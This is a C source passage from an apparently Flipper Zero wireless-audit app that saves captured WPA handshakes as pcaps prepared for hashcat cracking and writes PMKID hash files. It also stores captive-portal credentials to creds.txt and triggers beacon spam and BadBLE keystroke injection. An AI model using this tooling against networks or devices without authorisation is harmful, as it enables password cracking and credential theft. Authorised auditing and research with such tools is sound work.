// The board now answers SCAN:FAIL when its scan did not complete (it used to print SCAN:OK no
// matter what). Without this flag the app would send LIST anyway and show whatever stale results
// happened to be in RAM - the empty list this bug produced.
bool scanFailed = false;

bool parse_mac(const char* mac_str, uint8_t* out_bytes) {
    if(!mac_str || !out_bytes) return false;

    char mac_copy[18];
    strncpy(mac_copy, mac_str, sizeof(mac_copy));
    mac_copy[17] = '\0'; // Garantizar null terminator

    char* _sv = NULL;
    char* token = petrel_strtok(mac_copy, ":", &_sv);
    int i = 0;

    while(token != NULL && i < 6) {
        char* endptr;
        long value = strtol(token, &endptr, 16);

        if(*endptr != '\0' || value < 0 || value > 255) {
            return false; // Error en la conversión
        }

        out_bytes[i++] = (uint8_t)value;
        token = petrel_strtok(NULL, ":", &_sv);
    }

    return i == 6;
}

// --- P5 handshake capture: the board streams captured EAPOL frames as
// `HSFRAME:<hex>` lines (see RTL8720dn-firmware.ino CAPTURE/HSGRAB). We buffer them
// and rebuild a LINKTYPE_IEEE802_11 pcap on the SD card at `/ext/petrel/hs.pcap`,
// ready for `hcxpcapngtool -o x.hc22000` -> `hashcat -m 22000`. ---
#define HS_FRAME_MAX  256
#define HS_MAX_FRAMES 16
static uint8_t hs_frames[HS_MAX_FRAMES][HS_FRAME_MAX];
static uint16_t hs_lens[HS_MAX_FRAMES];
static uint16_t hs_count = 0;
static int hs_channel = 0;
static char popupHeader[20] = "ERROR";

static int hs_hexval(char c) {
    if(c >= '0' && c <= '9') return c - '0';
    if(c >= 'a' && c <= 'f') return c - 'a' + 10;
    if(c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static void hs_put_le32(uint8_t* p, uint32_t v) {
    p[0] = v & 0xFF;
    p[1] = (v >> 8) & 0xFF;
    p[2] = (v >> 16) & 0xFF;
    p[3] = (v >> 24) & 0xFF;
}

// The path is a parameter now: a single capture still lands in /ext/petrel/hs.pcap, while the
// E3 batch writes one pcap per AP into the session directory (otherwise each AP would
// overwrite the previous one).
// out_saved != NULL -> write synchronously and report whether the bytes reached the card (audit
// evidence path). out_saved == NULL -> queue async via storage_submit (quick-look / batch path).
static void hs_write_pcap(const char* path, uint16_t* out_frames, bool* out_saved) {
    if(out_saved) *out_saved = false;
    Storage* storage = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(storage, "/ext/petrel");
    furi_record_close(RECORD_STORAGE);
    uint16_t written = 0;
    uint8_t hdr[24] = {0};
    hs_put_le32(hdr + 0, 0xA1B2C3D4); // pcap magic (LE -> d4 c3 b2 a1)
    hs_put_le32(hdr + 4, 0x00040002); // version major=2 (u16), minor=4 (u16)
    hs_put_le32(hdr + 8, 0); // thiszone
    hs_put_le32(hdr + 12, 0); // sigfigs
    hs_put_le32(hdr + 16, 65535); // snaplen
    hs_put_le32(hdr + 20, 105); // LINKTYPE_IEEE802_11 (802.11, no FCS)
    // Size the record up front and serialise the whole pcap into one snapshot: the worker does the
    // I/O, so the GUI thread never touches the card for what is often the largest file we write.
    size_t total = sizeof(hdr);
    for(uint16_t i = 0; i < hs_count && i < HS_MAX_FRAMES; i++) {
        if(hs_lens[i] == 0) continue;
        total += 16 + hs_lens[i];
    }
    diag(14, (uint32_t)total, 0);                    // pcap snapshot requested
    char* snap = malloc(total);
    if(snap) {
        size_t off = 0;
        memcpy(snap + off, hdr, sizeof(hdr));
        off += sizeof(hdr);
        for(uint16_t i = 0; i < hs_count && i < HS_MAX_FRAMES; i++) {
            if(hs_lens[i] == 0) continue;
            uint8_t rec[16];
            uint32_t ts = furi_get_tick();
            hs_put_le32(rec + 0, ts / 1000);
            hs_put_le32(rec + 4, (ts % 1000) * 1000);
            hs_put_le32(rec + 8, hs_lens[i]);
            hs_put_le32(rec + 12, hs_lens[i]);
            memcpy(snap + off, rec, sizeof(rec));
            off += sizeof(rec);
            memcpy(snap + off, hs_frames[i], hs_lens[i]);
            off += hs_lens[i];
            written++;
        }
        if(out_saved) {
            // Audit evidence: confirm the write so `complete` and `saved` can differ honestly.
            *out_saved = storage_write_now(path, snap, off, false);
            free(snap);
        } else {
            // out_frames reports what was QUEUED; the worker logs the real outcome (short write vs
            // saved) separately - see storage_status.
            if(!storage_submit(path, snap, off, false)) free(snap);
        }
    }
    if(out_frames) *out_frames = written;
}

// Quality engine: delegate to the rigorous, host-tested petrel_capture_quality validator. It fully
// validates each buffered EAPOL-Key frame (frame control, DS bits, QoS/HT header length, LLC/SNAP,
// key-info sanity, non-degenerate nonce/MIC), de-duplicates, and reports crackability ONLY from a
// single consistent exchange: M1+M2 on the same (BSSID, STA) with equal replay, or (fallback) M2+M3
// with replay+1 and a matching ANonce. Far stronger than "some M1 and some M2 are present".
static bool hs_quality(char* out, size_t cap, char* hist, size_t hcap) {
    static PetrelCaptureQuality q;   // ~1 KB -> static, kept off the 6 KB app stack
    // Bind to the selected AP in audit mode so a valid pair from ANOTHER AP on the same channel
    // cannot mark this target's audit complete. NULL (quick-look / no target) = accept any BSSID.
    pcq_reset(&q, (audit_mode && audit_bssid_valid) ? audit_bssid_bytes : NULL);
    for(uint16_t i = 0; i < hs_count && i < HS_MAX_FRAMES; i++)
        pcq_ingest(&q, hs_frames[i], hs_lens[i]);
    pcq_summary(&q, out, cap);
    bool ok = pcq_has_pair(&q);   // true only when a crackable, exchange-consistent pair exists
    if(!ok) {                     // append the dominant drop reason as failure evidence
        char rb[24];
        pcq_reject_brief(&q, rb, sizeof(rb));
        if(rb[0]) {
            size_t l = strlen(out);
            if(cap > l) snprintf(out + l, cap - l, " [%s]", rb);
        }
    }
    if(hist) pcq_histogram(&q, hist, hcap);   // full per-category tally for the evidence report
    return ok;
}

// E: write a small audit summary next to the capture.
// Minimal JSON string escaping: quote and backslash get escaped, control characters become \uXXXX.
// Truncates rather than overflowing. The audit file is meant to be machine-readable, and SSIDs are
// attacker-chosen strings - an AP named  \" or with a backslash used to produce invalid JSON.
static void json_escape(const char* in, char* out, size_t cap) {
    size_t o = 0;
    if(cap == 0) return;
    for(const char* p = in; p && *p && o + 7 < cap; p++) {
        unsigned char c = (unsigned char)*p;
        if(c == '"' || c == '\\') {
            out[o++] = '\\';
            out[o++] = (char)c;
        } else if(c < 0x20) {
            o += (size_t)snprintf(out + o, cap - o, "\\u%04x", c);
        } else {
            out[o++] = (char)c;
        }
    }
    out[o] = '\0';
}

// Session-scoped artifact path: /ext/petrel/sessions/<session id>/<name>, directory created here.
// These artifacts used to have FIXED root filenames ("creds.txt", "audit.json", "pmkid.22000"), so
// every run silently overwrote the previous run's evidence - a captured credential line, an audit
// record or a PMKID hash was simply gone. Settings stay at a fixed path on purpose: they are
// configuration, not evidence.
static void petrel_artifact_path(char* out, size_t cap, const char* name) {
    Storage* st = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(st, "/ext/petrel");
    storage_common_mkdir(st, "/ext/petrel/sessions");
    char dir[96];
    snprintf(dir, sizeof(dir), "/ext/petrel/sessions/%s", petrel_session_id);
    storage_common_mkdir(st, dir);
    furi_record_close(RECORD_STORAGE);
    snprintf(out, cap, "%s/%s", dir, name);
}

// Structured, schema-versioned audit record. `complete` means the capture is quality-gated usable
// (an exchange-consistent handshake pair, or a real PMKID) - NOT merely "frames were written".
// `method` is the path the guided audit actually took; `pmf` records why (PMF -> clientless PMKID).
// `complete` = the capture is quality-gated usable (exchange-consistent handshake pair / real
// target-bound PMKID). `saved` = the evidence file was CONFIRMED written to the card. They are
// deliberately separate: a usable capture whose write failed is complete-but-not-saved, and the
// report must say so rather than claim a saved audit. `counters` is the full ingestion histogram.
static void audit_write_json(
    const char* method, int frames, bool complete, bool saved, const char* quality,
    const char* counters) {
    Storage* st = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(st, "/ext/petrel");
    furi_record_close(RECORD_STORAGE);
    char esc_ssid[96];
    json_escape(audit_ssid, esc_ssid, sizeof(esc_ssid));
    char esc_q[40];
    json_escape(quality ? quality : "", esc_q, sizeof(esc_q));
    char esc_c[80];
    json_escape(counters ? counters : "", esc_c, sizeof(esc_c));
    bool pmf = (audit_sec & WPA3_SECURITY) || (audit_sec & AES_CMAC_ENABLED);
    char apath[160];
    petrel_artifact_path(apath, sizeof(apath), "audit.json");
    char buf[448];
    int n = snprintf(
        buf,
        sizeof(buf),
        "{\"schema\":\"petrel.audit.v1\",\"ssid\":\"%s\",\"bssid\":\"%s\",\"channel\":%d,"
        "\"security\":%d,\"pmf\":%s,\"method\":\"%s\",\"frames\":%d,\"complete\":%s,\"saved\":%s,"
        "\"quality\":\"%s\",\"counters\":\"%s\"}\n",
        esc_ssid,
        audit_bssid,
        audit_ch,
        audit_sec,
        pmf ? "true" : "false",
        method,
        frames,
        complete ? "true" : "false",
        saved ? "true" : "false",
        esc_q,
        esc_c);
    if(n < 0) n = 0;
    if(n >= (int)sizeof(buf)) n = sizeof(buf) - 1;
    // Hand the record to the storage worker (same shape as the other converted writers).
    char* snap = malloc((size_t)n);
    if(snap) {
        memcpy(snap, buf, (size_t)n);
        if(!storage_submit(apath, snap, (size_t)n, false)) free(snap);
    }
    // Evidence pack: also drop a human-readable run report beside the machine-readable audit.json.
    char rpath[160];
    petrel_artifact_path(rpath, sizeof(rpath), "report.txt");
    char rbuf[416];
    int rn = snprintf(
        rbuf,
        sizeof(rbuf),
        "Petrel audit report\n"
        "AP:      %s (%s) ch %d\n"
        "PMF:     %s    method: %s\n"
        "result:  %s   saved: %s\n"
        "quality: %s\n"
        "counters:%s\n"
        "capture: %s (+ audit.json) in this session dir\n",
        audit_ssid,
        audit_bssid,
        audit_ch,
        pmf ? "yes" : "no",
        method,
        complete ? "COMPLETE" : "PARTIAL",
        saved ? "yes" : "NOT SAVED",
        (quality && quality[0]) ? quality : "-",
        (counters && counters[0]) ? counters : "-",
        (strcmp(method, "pmkid") == 0)       ? "pmkid.22000" :
        (strcmp(method, "unsupported") == 0) ? "(none)" :
                                               "hs.pcap");
    if(rn < 0) rn = 0;
    if(rn >= (int)sizeof(rbuf)) rn = sizeof(rbuf) - 1;
    char* rsnap = malloc((size_t)rn);
    if(rsnap) {
        memcpy(rsnap, rbuf, (size_t)rn);
        if(!storage_submit(rpath, rsnap, (size_t)rn, false)) free(rsnap);
    }
    audit_mode = false;
}

// A WPA*01* (hashcat 22000) line is usable only if its PMKID - the 32 hex after "WPA*01*" - is
// present, hex, delimited, and NOT all zero (a degenerate/empty value some APs/parsers emit). This
// rejects junk before it ever reaches the capture buffer or the completion gate.
static inline bool is_hex(char c) {
    return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
}
static inline uint8_t hexnib(char c) {
    if(c >= '0' && c <= '9') return (uint8_t)(c - '0');
    if(c >= 'a' && c <= 'f') return (uint8_t)(c - 'a' + 10);
    if(c >= 'A' && c <= 'F') return (uint8_t)(c - 'A' + 10);
    return 0;
}
static bool pmkid_line_valid(const char* s) {
    // Full hashcat-22000 PMKID record: WPA*01*<pmkid>*<ap-mac>*<sta-mac>*<essid>*...  The earlier
    // check accepted a bare 32-hex token, so a partial/degenerate line (and another AP's hash)
    // passed. Validate every structural field, reject all-zero/all-F PMKIDs, and - in audit mode -
    // bind the AP MAC to the selected target so a channel-wide PMKID cannot complete this audit.
    if(strncmp(s, "WPA*01*", 7) != 0) return false;
    const char* p = s + 7;
    bool nonzero = false, nonff = false;      // PMKID must carry entropy (not all 0 / all F)
    for(int i = 0; i < 32; i++) {
        if(!is_hex(p[i])) return false;
        if(p[i] != '0') nonzero = true;
        if(p[i] != 'f' && p[i] != 'F') nonff = true;
    }
    if(!nonzero || !nonff || p[32] != '*') return false;
    const char* ap = p + 33;                  // field: AP MAC (12 hex)
    for(int i = 0; i < 12; i++)
        if(!is_hex(ap[i])) return false;
    if(ap[12] != '*') return false;
    if(audit_mode && audit_bssid_valid) {     // must be the AP we were asked to audit
        char want[12];
        for(int i = 0; i < 6; i++) {
            static const char hx[] = "0123456789abcdef";
            want[i * 2] = hx[audit_bssid_bytes[i] >> 4];
            want[i * 2 + 1] = hx[audit_bssid_bytes[i] & 0xF];
        }
        for(int i = 0; i < 12; i++) {
            char c = ap[i];
            if(c >= 'A' && c <= 'F') c = (char)(c + 32);   // tolower, ASCII-only
            if(c != want[i]) return false;
        }
    }
    const char* sta = ap + 13;                // field: STA MAC (12 hex)
    for(int i = 0; i < 12; i++)
        if(!is_hex(sta[i])) return false;
    if(sta[12] != '*') return false;
    const char* es = sta + 13;                // field: ESSID (hex, even length, up to next '*')
    int el = 0;
    while(es[el] && es[el] != '*') el++;
    if(el % 2 != 0) return false;
    for(int i = 0; i < el; i++)
        if(!is_hex(es[i])) return false;
    return es[el] == '*';                      // the delimiter before the empty nonce field
}

// Evidence pack: dump collected PMKID WPA*01* lines to /ext/petrel/pmkid.22000.
// confirm=true -> synchronous write returning whether the hashes reached the card (audit evidence);
// confirm=false -> async queue (non-audit). Returns false when there is nothing to write.
static bool write_wpa_file(bool confirm) {
    if(wpa_lines[0] == '\0') return false;
    Storage* st = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(st, "/ext/petrel");
    furi_record_close(RECORD_STORAGE);
    size_t len = strlen(wpa_lines);
    char apath[160];
    petrel_artifact_path(apath, sizeof(apath), "pmkid.22000");
    char* snap = malloc(len);
    if(!snap) return false;
    memcpy(snap, wpa_lines, len);
    if(confirm) {
        bool ok = storage_write_now(apath, snap, len, false);
        free(snap);
        return ok;
    }
    if(!storage_submit(apath, snap, len, false)) free(snap);
    return false;
}

// Captured captive-portal creds -> /ext/petrel/creds.txt (append, timestamped), so they
// persist on the SD instead of only living in the on-screen RAM buffer.
static void creds_append_sd(const char* line) {
    if(!line || line[0] == '\0') return;
    Storage* st = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(st, "/ext/petrel");
    furi_record_close(RECORD_STORAGE);
    DateTime dt;
    furi_hal_rtc_get_datetime(&dt);
    char stamp[48];
    int n = snprintf(
        stamp, sizeof(stamp), "[%04d-%02d-%02d %02d:%02d:%02d] ",
        dt.year, dt.month, dt.day, dt.hour, dt.minute, dt.second);
    size_t llen = strlen(line);
    char apath[160];
    petrel_artifact_path(apath, sizeof(apath), "creds.txt");
    size_t total = (size_t)n + llen + 1;
    char* snap = malloc(total);
    if(snap) {
        memcpy(snap, stamp, (size_t)n);
        memcpy(snap + n, line, llen);
        snap[n + llen] = '\n';
        // append=true -> the worker opens with FSOM_OPEN_APPEND, preserving the old semantics.
        if(!storage_submit(apath, snap, total, true)) free(snap);
    }
}

static void listed_wifis_item_callback(void* context, uint32_t index);
static void petrel_busy(Petrel* app, const char* header, const char* text);
static void petrel_busy_ex(Petrel* app, const char* header, const char* text, int secs);
static void petrel_send_portal_sel(Petrel* app);
static void petrel_ident(Petrel* app);

// Persist the SCAN RESULTS to the SD (not an action log). One timestamped file per
// scan under /ext/petrel/scans/ (e.g. 2026-10-15_13-40-12_wifis.txt) with a small header, so
// every Wi-Fi/PMF/STA/BLE result survives a reboot and can be reviewed later.
static void petrel_save_scan(const char* kind, const char* body) {
    if(!kind) return;
    if(!set_save) return;   // E4: "Save results" off -> nothing is written
    char name[48];
    snprintf(name, sizeof(name), "%s.txt", kind);
    char path[160];
    petrel_artifact_path(path, sizeof(path), name);   // same helper the other artifacts use
    DateTime dt;
    furi_hal_rtc_get_datetime(&dt);
    char hdr[96];
    int n = snprintf(
        hdr,
        sizeof(hdr),
        "# %04d-%02d-%02d %02d:%02d:%02d  %s\n",
        dt.year,
        dt.month,
        dt.day,
        dt.hour,
        dt.minute,
        dt.second,
        kind);
    // Serialise the whole record and hand it to the storage worker. This used to be a synchronous
    // write from the GUI thread, from inside the UART line handler.
    size_t blen = (body && body[0]) ? strlen(body) : 0;
    size_t total = (size_t)n + blen;
    diag(14, (uint32_t)total, 1);                    // scan-list snapshot requested
    char* snap = malloc(total);
    if(snap) {
        memcpy(snap, hdr, (size_t)n);
        if(blen) memcpy(snap + n, body, blen);
        if(!storage_submit(path, snap, total, false)) free(snap);   // queue full -> drop, no block
    }
}

// Build "BSSID|SSID|ch|rssi|security" lines for the whole scanned AP list and save it.
static void petrel_save_wifi_list(Petrel* app) {
    if(app->wifiCount <= 0) return;
    size_t cap = (size_t)app->wifiCount * 96u + 1u;
    // Heap guard (2026-10-28 hardware run): this path holds TWO buffers of ~cap at once - the body
    // here and the header+body copy inside petrel_save_scan(). With 48 APs that is ~9.2 KB, and it
    // lands exactly when the scan results finish arriving. With a flipctl RPC session holding ~18 KB
    // the Flipper OOM-crashed here and rebooted. Dropping the save keeps the results on screen.
    if(memmgr_heap_get_max_free_block() < cap + 512u) {
        diag(44, (uint32_t)cap, (uint32_t)memmgr_heap_get_max_free_block());
        STORAGE_STATUS("low memory: list not saved");
        storage_fail_seq++;
        return;
    }
    char* buf = malloc(cap);
    if(!buf) {
        diag(44, (uint32_t)cap, 0);   /* malloc failed despite the guard */
        return;
    }
    buf[0] = '\0';
    for(int i = 0; i < app->wifiCount; i++) {
        char line[112];
        snprintf(
            line,
            sizeof(line),
            "%s|%s|ch%d|%ddBm|0x%X\n",
            app->wifiList[i].APbssid,
            app->wifiList[i].APssid,
            app->wifiList[i].chanel,
            app->wifiList[i].rssi,
            app->wifiList[i].security);
        if(strlen(buf) + strlen(line) < cap) petrel_strcat(buf, line);
    }
    petrel_save_scan("wifis", buf);
    free(buf);
}
static void busy_show(Petrel* app);
static bool petrel_has_cap(Petrel* app, char cap);
static void petrel_adv_replay(Petrel* app);
static void petrel_badble_file(Petrel* app);
void Petrel_menu_callback(void* context, uint32_t index) {
    FURI_LOG_D(TAG, __func__);
    Petrel* app = context;
    FURI_LOG_I("Petrel", "index: %ld", index);
    switch(index) {
    case ScanWifi:
        FURI_LOG_I("Petrel", "scanWifis");
        scene_manager_handle_custom_event(app->scene_manager, ScanWifi);
        break;
    case ListWifis:
        FURI_LOG_I("Petrel", "listwifis");
        scene_manager_handle_custom_event(app->scene_manager, ListWifis);
        break;
    case CustomBeacon:
        FURI_LOG_I("Petrel", "customAP");
        scene_manager_handle_custom_event(app->scene_manager, CustomBeacon);
        break;
    case CreateAP:
        FURI_LOG_I("Petrel", "CreateAP");
        scene_manager_handle_custom_event(app->scene_manager, CreateAP);
        break;
    case Help:
        FURI_LOG_I("Petrel", "Help");
        scene_manager_handle_custom_event(app->scene_manager, Help);
        break;
    case ChannelMap:
        FURI_LOG_I("Petrel", "ChannelMap");
        scene_manager_handle_custom_event(app->scene_manager, ChannelMap);
        break;
    case BleScan:
        FURI_LOG_I("Petrel", "BleScan");
        scene_manager_handle_custom_event(app->scene_manager, BleScan);
        break;
    case BleBeacon:
        FURI_LOG_I("Petrel", "BleBeacon");
        scene_manager_handle_custom_event(app->scene_manager, BleBeacon);
        break;
    case BadBle:
        FURI_LOG_I("Petrel", "BadBle");
        scene_manager_handle_custom_event(app->scene_manager, BadBle);
        break;
    case PortalFile:
        FURI_LOG_I("Petrel", "PortalFile");
        scene_manager_handle_custom_event(app->scene_manager, PortalFile);
        break;
    case BleAdvHex:
        scene_manager_handle_custom_event(app->scene_manager, BleAdvHex);
        break;
    case BleAdvReplay:
        scene_manager_handle_custom_event(app->scene_manager, BleAdvReplay);
        break;
    case IBeaconUuid:
        scene_manager_handle_custom_event(app->scene_manager, IBeaconUuid);
        break;
    case BadBleFile:
        scene_manager_handle_custom_event(app->scene_manager, BadBleFile);
        break;
    case WifiHub:
        scene_manager_handle_custom_event(app->scene_manager, WifiHub);
        break;
    case BleHub:
        scene_manager_handle_custom_event(app->scene_manager, BleHub);
        break;
    case Exit:
        uart_helper_send(app->uart_helper, "STOP\n", 5);
        FURI_LOG_I("Petrel", "Exit");
        view_dispatcher_stop(app->view_dispatcher);
        //scene_manager_handle_custom_event(app->scene_manager, Exit);
        break;
    default:
        break;
    }
}

//Todos los eventos de la APP
void main_menu_scene_on_enter(void* context) {
    FURI_LOG_D(TAG, __func__);
    Petrel* app = context;
    petrel_ident(app);
    view_dispatcher_switch_to_view(app->view_dispatcher, cardMenuView);

    UNUSED(context);
}
static void app_free(Petrel* app);
bool main_menu_scene_on_event(void* context, SceneManagerEvent event) {
    FURI_LOG_D(TAG, __func__);
    Petrel* app = context;

    FURI_LOG_I("Petrel", "%s event.type: %d", __func__, event.type);
    FURI_LOG_I("Petrel", "%s event.event: %ldd", __func__, event.event);
    switch(event.type) {
    case SceneManagerEventTypeCustom:
        switch(event.event) {
        case ScanWifi:
            scene_manager_next_scene(app->scene_manager, scanNetworksScene);
            break;
        case ListWifis:
            scene_manager_next_scene(app->scene_manager, listNetworksScene);
            break;
        case CustomBeacon:
            scene_manager_next_scene(app->scene_manager, beaconNetworkScene);
            break;
        case CreateAP:
            //uart_helper_send(app->uart_helper, "APMAC 00:E0:4C:01:02:03", 24);
            //furi_delay_ms(200);
            //uart_helper_send(app->uart_helper, "APSTART ", 8);
            scene_manager_next_scene(app->scene_manager, configAPScene);
            break;
        case Help:
            scene_manager_next_scene(app->scene_manager, helpScene);
            break;
        case ChannelMap:
            scene_manager_next_scene(app->scene_manager, channelMapScene);
            break;
        case BleScan:
            recon_text[0] = '\0';
            snprintf(recon_title, sizeof(recon_title), "BLE");
            uart_helper_send(app->uart_helper, "BLESCAN 8\n", 10);
            petrel_busy(app, "BLE", "Scanning BLE...");
            break;
        case BleBeacon:
            // Broadcast a demo iBeacon (fixed UUID/major/minor) for 30s.
            {
                const char* c = "BLEIBEACON 0102030405060708090A0B0C0D0E0F10 1 1 30\n";
                uart_helper_send(app->uart_helper, c, strlen(c));
            }
            petrel_busy(app, "BLE", "iBeacon 30s...");
            break;
        case BadBle:
            // Advertise as a HID keyboard for 30s (types once a host connects).
            uart_helper_send(app->uart_helper, "BADBLE 30\n", 10);
            petrel_busy(app, "BadBLE", "BadBLE 30s...");
            break;
        case PortalFile:
            scene_manager_next_scene(app->scene_manager, portalListScene);
            break;
        case BleAdvHex:
            scene_manager_next_scene(app->scene_manager, bleAdvInputScene);
            break;
        case BleAdvReplay:
            petrel_adv_replay(app);
            break;
        case IBeaconUuid:
            scene_manager_next_scene(app->scene_manager, ibeaconInputScene);
            break;
        case BadBleFile:
            petrel_badble_file(app);
            break;
        case WifiHub:
            scene_manager_next_scene(app->scene_manager, wifiHubScene);
            break;
        case BleHub:
            scene_manager_next_scene(app->scene_manager, bleHubScene);
            break;
        default:
            FURI_LOG_W("Petrel", "Evento desconocido: %ld", event.event);
            break;
        }
        return true;
        break;
    case SceneManagerEventTypeBack:

        break;
    default:
        FURI_LOG_W("Petrel", "Tipo de evento desconocido: %d", event.type);

        break;
    }
    return false;
}

void main_menu_scene_on_exit(void* context) {
    FURI_LOG_D(TAG, __func__);
    UNUSED(context);
}
void scan_networks_scene_on_enter(void* context) {
    FURI_LOG_D(TAG, __func__);

    Petrel* app = context;
    app->menuIndex = 0;
    snprintf(popupHeader, sizeof(popupHeader), "%s", "Wi-Fi");
    snprintf(message, sizeof(message), "%s", "Scanning networks...");
    busy_show(app);
    app->wifiCount = 0; // fixed-size list in BSS: just reset the count (no heap)

    // Do not block the GUI here. The worker used to fill wifiList while this thread slept in
    // furi_delay_ms - the race being removed. uart_gui_tick watches the same wait on the dispatcher
    // thread and sends LIST when it expires (or earlier, when SCAN:OK arrives).
    app->scan_waiting = true;
    // The deadline is a BACKSTOP, not the expected exit: the board answers SCAN:OK (or SCAN:FAIL)
    // when its scan actually finishes, and a scan can take longer than the configured wait - the
    // old deadline then fired first and the following LIST raced the board's own scan, which is
    // why the result list came back empty. Wait for the reply, with a generous cap.
    app->scan_deadline =
        furi_get_tick() + furi_ms_to_ticks((uint32_t)set_scan_wait * 1000U + 20000U);
    scanFinish = false;
    scanFailed = false;
    diag(30, 1, app->scan_deadline); /* scan armed; absolute deadline */
    diag(33, 1, 0);                /* SCAN send begin */
    uart_helper_send(app->uart_helper, "SCAN\n", 5);
    diag(33, 1, 1);                /* SCAN send returned */
}
bool scan_networks_scene_on_event(void* context, SceneManagerEvent event) {
    FURI_LOG_D(TAG, __func__);
    Petrel* app = context;
    switch(event.type) {
    case SceneManagerEventTypeCustom:
        // Animate the shared busy spinner while the scan runs. scan_..._on_enter calls busy_show(),
        // which shows busyView and starts busyTimer; busyTimer posts PETREL_EVT_BUSY_TICK every
        // 120 ms. busyScene advances the spinner on that tick, but this scene used to swallow it
        // (bare `return true`), so the spinner's phase never moved and the ~20 s scan backstop
        // looked frozen. Advance the phase here too (mirrors busy_scene_on_event; no countdown).
        if(event.event == PETREL_EVT_BUSY_TICK) {
            with_view_model(app->busyView, BusyModel* m, { m->phase++; }, true);
        }
        return true;
    default:
        break;
    }
    return false;
}
void scan_networks_scene_on_exit(void* context) {
    FURI_LOG_D(TAG, __func__);
    Petrel* app = context;
    app->scan_waiting = false;
    diag(30, 5, 0);
    furi_timer_stop(app->busyTimer);
    diag(30, 5, 1);
}
void list_networks_scene_on_enter(void* context) {
    FURI_LOG_D(TAG, __func__);
    Petrel* app = context;
    // Sort by signal strength (strongest first) so the most useful APs are on top. The
    // submenu item ids below are the SORTED indices and listed_wifis_item_callback maps them
    // back to wifiList, so the info screen stays consistent.
    for(int i = 1; i < app->wifiCount; i++) {
        APDetails key = app->wifiList[i];
        int j = i - 1;
        while(j >= 0 && app->wifiList[j].rssi < key.rssi) {
            app->wifiList[j + 1] = app->wifiList[j];
            j--;
        }
        app->wifiList[j + 1] = key;
    }
    petrel_save_wifi_list(app);   // persist the scanned AP list to /ext/petrel/scans/
    sess_wifis = app->wifiCount;
    app->menuIndex = 1;
    app->submenuIndex = 0;
    submenu_reset(app->submenu);
    submenu_set_header(app->submenu, "Scanned wifis");
    for(int i = 0; i < app->wifiCount; i++) {
        // "<D|><band>|<ssid up to 12> <rssi>" — one snprintf, no strncat/strnlen (those are
        // not in the firmware's export table; using them trips the FAP loader's
        // "MissingImports" check).
        char temp[48];
        snprintf(
            temp,
            sizeof(temp),
            "%s%s|%.12s %d",
            app->wifiList[i].deauth ? "D|" : "",
            (app->wifiList[i].chanel > 14) ? "5G" : "2G",
            app->wifiList[i].APssid,
            app->wifiList[i].rssi);
        submenu_add_item(app->submenu, temp, app->submenuIndex++, listed_wifis_item_callback, app);
    }
    // Normalize the saved selection against the list actually built (D6-2, architect): a stale
    // index from a longer scan must not walk off the end.
    if(app->wifiCount <= 0 || app->selectedWifi < 0 || app->selectedWifi >= app->wifiCount) {
        app->selectedWifi = 0;
    }
    if(app->wifiCount > 0) {
        submenu_set_selected_item(app->submenu, app->selectedWifi);
    }

    view_dispatcher_switch_to_view(app->view_dispatcher, scannedWifisView);
}
bool list_networks_scene_on_event(void* context, SceneManagerEvent event) {
    FURI_LOG_D(TAG, __func__);
    UNUSED(context);
    switch(event.type) {
    case SceneManagerEventTypeCustom:
        return true;
    default:
        break;
    }
    return false;
}
void list_networks_scene_on_exit(void* context) {
    FURI_LOG_D(TAG, __func__);
    UNUSED(context);
}

static void listed_wifis_item_callback(void* context, uint32_t index) {
    FURI_LOG_D(TAG, __func__);
    Petrel* app = context;

    app->selectedWifi = index;

    scene_manager_next_scene(app->scene_manager, wifiInfoScene);
}

void beacon_networks_text_input_callback(void* context) {
    FURI_LOG_D(TAG, __func__);
    Petrel* app = context;

    scene_manager_handle_custom_event(app->scene_manager, SsidAPInputSceneSaveEvent);
}
static void listed_beacon_items_callback(void* context, uint32_t index) {
    FURI_LOG_D(TAG, __func__);
    Petrel* app = context;
    app->submenuIndex = index;
    switch(index) {
    case 0:
        //Custom
        scene_manager_next_scene(app->scene_manager, customBeaconScene);
        break;
    case 1:
        //Random
        uart_helper_send(app->uart_helper, "RANDOM\n", 7);
        scene_manager_next_scene(app->scene_manager, beaconInfoScene);
        break;
    case 2:
        //RickRoll
        uart_helper_send(app->uart_helper, "RICKROLL\n", 9);
        scene_manager_next_scene(app->scene_manager, beaconInfoScene);
        break;
    case 3:
        //Ghost AP Beacon (BEACONSPAM GHOST)
        uart_helper_send(app->uart_helper, "GHOSTSPAM\n", 10);
        scene_manager_next_scene(app->scene_manager, beaconInfoScene);
        break;
    }
    UNUSED(context);

    UNUSED(index);
}
void beacon_network_scene_on_enter(void* context) {
    FURI_LOG_D(TAG, __func__);
    Petrel* app = context;
    app->menuIndex = 2;
    submenu_reset(app->submenu);
    submenu_set_header(app->submenu, "Select type of beacon");
    submenu_add_item(app->submenu, "Custom AP Beacon", 0, listed_beacon_items_callback, app);
    submenu_add_item(app->submenu, "Random AP Beacon", 1, listed_beacon_items_callback, app);
    submenu_add_item(app->submenu, "RickRoll AP Beacon", 2, listed_beacon_items_callback, app);
    submenu_add_item(app->submenu, "Ghost AP Beacon", 3, listed_beacon_items_callback, app);

    view_dispatcher_switch_to_view(app->view_dispatcher, beaconListView);
}

bool beacon_network_scene_on_event(void* context, SceneManagerEvent event) {
    UNUSED(context);
    UNUSED(event);
    return false;
}

void beacon_network_scene_on_exit(void* context) {
    FURI_LOG_D(TAG, __func__);
    UNUSED(context);
}
// D: PMF/SAE estimate from the Realtek security bitmask (mirrors 5Ghost).
// WPA3 mandates PMF; AES_CMAC is the BIP cipher. A WPA2 AP with PMF-optional isn't
// distinguishable from the bitmask alone -> run "PMF/WPA3 scan" for the precise RSN-IE answer.
static const char* petrel_pmf_tag(int security) {
    if(security & WPA3_SECURITY) return "PMF!";
    if(security & AES_CMAC_ENABLED) return "PMF";
    return "";
}

void info_wifi_scene_on_enter(void* context);
void info_wifi_button_press(GuiButtonType result, InputType type, void* context) {
    Petrel* app = context;
    // The widget's button element invokes this for EVERY event type of the matching key (press,
    // release, repeat), so act on the press only - otherwise one tap fires twice.
    if(type != InputTypePress) return;
    FURI_LOG_D(TAG, "%s %d %d", __func__, type, result);
    // Do not touch the widget and do not switch scenes here: this runs inside the widget's own
